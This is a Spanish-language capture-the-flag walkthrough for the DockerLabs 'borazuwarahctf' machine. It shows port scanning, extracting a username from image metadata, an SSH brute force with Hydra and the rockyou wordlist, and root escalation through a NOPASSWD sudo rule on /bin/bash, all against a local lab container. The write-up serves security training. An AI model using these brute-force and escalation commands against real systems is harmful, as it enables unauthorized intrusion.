---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `Steganography` `Steghide` `Exiftool` `Hydra` `Sudoers`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip borazuwarahctf.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh borazuwarahctf.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 19:26 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Tenemos abiertos los puertos `22` y `80`.

Accedemos por `HTTP` y nos encontramos con una imagen de un Kinder Sorpresa.

Realizamos `fuzzing` de directorios para identificar directorios o archivos ocultos, pero no encontramos nada.

En este punto, asumimos que la imagen debe proporcionarnos la información que necesitamos.

Descargamos la imagen y comprobamos si contiene algún mensaje oculto.

```bash
steghide extract -sf Untitled.jpeg
```

Info:

```
Enter passphrase: 
wrote extracted data to "secreto.txt".
```

Nos solicita una passphrase, pero la dejamos en blanco. Aun así, conseguimos extraer información oculta de la imagen, que se guarda en un archivo `secreto.txt`.

```
Sigue buscando, aquí no está to solución
aunque te dejo una pista....
sigue buscando en la imagen!!!
```

Lo leemos y la pista nos indica que debemos buscar más información dentro de la propia imagen.

Se me ocurre revisar los `metadatos` de la imagen.

```bash
exiftool Untitled.jpeg
```

Info:

```
ExifTool Version Number         : 13.25
File Name                       : Untitled.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2025:09:11 19:30:52+02:00
File Access Date/Time           : 2025:09:11 19:31:12+02:00
File Inode Change Date/Time     : 2025:09:11 19:30:52+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

Encontramos un usuario válido en los metadatos: `borazuwarah`.

## FUERZA BRUTA

Intentamos un ataque de `fuerza bruta` por `SSH` con este usuario.

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 19:37:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
```

Obtenemos credenciales para `borazuwarah` : `123456`.

Accedemos por SSH.

```bash
ssh borazuwarah@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for borazuwarah on bd1074449ef9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User borazuwarah may run the following commands on bd1074449ef9:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Comprobamos que el usuario `borazuwarah` puede ejecutar el binario `bash` con privilegios de cualquier usuario del sistema, incluido `root`. Por lo tanto, para escalar a `root` solo tendríamos que hacer lo siguiente.

```bash
sudo -u root /bin/bash
```

Info:

```
root@bd1074449ef9:/home/borazuwarah# whoami
root
root@bd1074449ef9:/home/borazuwarah#
```

Ya somos root!
